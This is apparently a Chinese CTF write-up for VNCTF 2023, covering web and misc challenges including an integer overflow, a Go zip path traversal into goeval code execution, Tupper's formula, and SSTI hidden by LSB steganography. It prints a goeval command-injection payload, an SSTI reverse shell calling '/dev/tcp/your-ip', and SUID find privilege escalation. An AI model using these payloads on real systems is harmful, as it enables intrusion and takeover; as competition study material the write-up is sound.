## Web
### 象棋王子
在js源码 play.js中找到赢之后执行的逻辑，直接控制台执行
![](attachments/Pasted%20image%2020230427123520.png)


![](attachments/Pasted%20image%2020230427123350.png)

flag{w3lc0m3_t0_VNCTF_2023~~~}

### 电子木鱼
rust编写的后端，要1亿功德拿flag

![](attachments/Pasted%20image%2020230427124500.png)

这里考虑将cost设置为一个极限的负数，使功德减去它的时候能够转正 
i32的大小是 -2147483648~2147483647，经典的构造极限

没有思考了，在极限那个位置reset了几次
payload `name=Cost&quantity=214748366`

![](attachments/Pasted%20image%2020230427131811.png)

### BabyGo
go语言
一共5个路由
- GET /
- GET /upload
- POST /upload
	- 禁止上传 .gob 和 .go 文件
- GET /unzip
	- 解压文件，文件路径来自与get参数拼接
- GET /backdoor
	- 解码引用user.gob  在 Power为 admin 时 可以通过 goeval.Eval() 来执行命令

>思路：上传压缩文件，解压后覆盖原有user.gob 以此引用 /backdoor来执行命令，由于在调用的时候有decode的操作，我们生成的文件也需要是对应二进制的才能decode

[Go语言二进制文件的读写操作 (biancheng.net)](http://c.biancheng.net/view/4563.html)

```go
package main

import (
    "encoding/gob"
    "fmt"
    "os"
)

type User struct {
    Path string
    Name string
    Power string
}

func main() {
    user := User{Name: "ctfer", Path: "/tmp/d7671aa466b2c69f80e4bc0cf4b6b638/", Power: "admin",}
    file, err := os.Create("./user.gob")
    if err != nil {
        fmt.Println("文件创建失败", err.Error())
        return
    }
    defer file.Close()

    encoder := gob.NewEncoder(file)
    err = encoder.Encode(user)
    if err != nil {
        fmt.Println("编码错误", err.Error())
        return
    } else {
        fmt.Println("编码成功")
    }
}
```

解压时path可控，可以直接目录穿越
path=/../../../../../tmp/d7671aa466b2c69f80e4bc0cf4b6b638/
带着参数访问unzip就可以

![](attachments/Pasted%20image%2020230427135428.png)

当backdoor回显是good，就说明已经power=admin了
![](attachments/Pasted%20image%2020230427145609.png)

接下来就是goeval的使用
[GO语言安全 — 沙箱逃逸题目分析 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247496259&idx=1&sn=20b93256d8a5acfda5826c5d50096f63&chksm=fa5227fdcd25aeebbf9f9add2a483500a252d5ad058a92dafad394eaa1c57cf2bdb597e51b5c&scene=126&sessionid=1662436887&key=c28b5d09085340df0c20cadc0887eb0a420d5b3478fb82405c1162a5003fd87a918cab97f0023574a573ac935bbb17c54b4098410befadcc31f8320ab2775346154c10836855dd919d18f6653ef474ed1062c1b09cc3588cc8443f46baeb60df34d6211b9cc5d40cf20b4d7620e849c117bcb06d9142c9a0e852b2f08ec8a0af&ascene=15&uin=MzgxODQ4MjMz&devicetype=Windows+Server+2016+x64&version=63070517&lang=zh_CN&session_us=gh_94beeafaf804&exportkey=AzYl%2FCartrKvkaqiL%2Bd9Iv4%3D&acctmode=0&pass_ticket=L3CGnrfwXOeo2T%2Buh4YWaI7nRTXofYaJoUhuF2SbHMXZ9TQM3m3vlwD2pKPsf2tC&wx_header=0&fontgear=2)
这篇文章文末有可用的payload，中间还有goeval的分析
```
os/exec"%0a"fmt")%0afunc%09init()%7B%0acmd:=exec.Command("/bin/sh","-c","cat${IFS}/ffflllaaaggg")%0ares,err:=cmd.CombinedOutput()%0afmt.Println(err)%0afmt.Println(string(res))%0a}%0aconst(%0aMessage="fmt
```

![](attachments/Pasted%20image%2020230427150603.png)


### easyzentao
0day

## Misc
### 验证码
hint是 tupper
这里指的的tupper自指公式

验证码识别脚本

```python
import ddddocr  
  
path = "C:\\Users\\wum0nster\\Desktop\\buu\\2023VNCTF\\验证码\\img\\imgs\\"  
tupper = ""  
ocr = ddddocr.DdddOcr()  
for i in range(0, 136):  
   png = path + f"{i}.png"  
   with open(png, 'rb') as f:  
      img_bytes = f.read()  
   res = ocr.classification(img_bytes)  
   print('识别出的验证码为：' + res)  
   tupper += res  
print(tupper)
```

tupper脚本

```python
from functools import reduce  
  
  
def Tuppers_Self_Referential_Formula():  
    k = 1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865378478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279552  
  
    # 这里替换为你自己的K值  
  
    def f(x, y):  
        d = ((-17 * x) - (y % 17))  
        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1  
        g = ((y // 17) // e) % 2  
        return 0.5 < g  
  
    for y in range(k + 16, k - 1, -1):  
        line = ""  
        for x in range(0, 107):  
            if f(x, y):  
                line += " ■"  
            else:  
                line += "  "  
        print(line)  
  
  
if __name__ == '__main__':  
    Tuppers_Self_Referential_Formula()
```

tupper在线网站

![](attachments/Pasted%20image%2020230427161643.png)

flag{MISC_COOL!}

### LSSTIB
文件上传 ssti！！！

用最简单的ssti就可以，但是要用lsb隐写

`{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/your-ip/2345 0>&1"').read()}}`

lsb脚本

```python
# -*- coding: utf-8 -*-
"""
Created on Sun May 19 11:20:05 2019
@author: Administrator
"""

from PIL import Image


def plus(string):
    # Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。
    return string.zfill(8)


def get_key(strr):
    # 获取要隐藏的文件内容
    with open(strr, "rb") as f:
        s = f.read()
        string = ""
        for i in range(len(s)):
         # 逐个字节将要隐藏的文件内容转换为二进制，并拼接起来
         # 1.先用ord()函数将s的内容逐个转换为ascii码
         # 2.使用bin()函数将十进制的ascii码转换为二进制
         # 3.由于bin()函数转换二进制后，二进制字符串的前面会有"0b"来表示这个字符串是二进制形式，所以用replace()替换为空
         # 4.又由于ascii码转换二进制后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位
            string = string+""+plus(bin(s[i]).replace('0b', ''))
    # print(string)
    return string


def mod(x, y):
    return x % y

# str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径


def func(str1, str2, str3):
    im = Image.open(str1)
    # 获取图片的宽和高
    width, height = im.size[0], im.size[1]
    print("width:"+str(width))
    print("height:"+str(height))
    count = 0
    # 获取需要隐藏的信息
    key = get_key(str2)
    keylen = len(key)
    for h in range(height):
        for w in range(width):
            pixel = im.getpixel((w, h))
            a = pixel[0]
            b = pixel[1]
            c = pixel[2]
            if count == keylen:
                break
            # 下面的操作是将信息隐藏进去
            # 分别将每个像素点的RGB值余2，这样可以去掉最低位的值
            # 再从需要隐藏的信息中取出一位，转换为整型
            # 两值相加，就把信息隐藏起来了
            a = a-mod(a, 2)+int(key[count])
            count += 1
            if count == keylen:
                im.putpixel((w, h), (a, b, c))
                break
            b = b-mod(b, 2)+int(key[count])
            count += 1
            if count == keylen:
                im.putpixel((w, h), (a, b, c))
                break
            c = c-mod(c, 2)+int(key[count])
            count += 1
            if count == keylen:
                im.putpixel((w, h), (a, b, c))
                break
            if count % 3 == 0:
                im.putpixel((w, h), (a, b, c))
    im.save(str3)


def main():
    # 原图
    old = "flag.png"
    # 处理后输出的图片路径
    new = "flag_encode.png"
    # 需要隐藏的信息
    enc = "a.txt"
    func(old, enc, new)


if __name__ == '__main__':
    main()



```

弹到shell

![](attachments/Pasted%20image%2020230427162734.png)

简单的suid提权

`find / -user root -perm -4000 -print 2>/dev/null`

![](attachments/Pasted%20image%2020230427163443.png)

只有find可以suid提权
`find . -exec /bin/sh -p \; -quit`
这里推荐一个网站 [GTFOBins](https://gtfobins.github.io/)

![](attachments/Pasted%20image%2020230427163729.png)


## 参考文章
[(58条消息) VNCTF2023-misc方向wp_ttttototooo的博客-CSDN博客](https://blog.csdn.net/jyttttttt/article/details/129114207)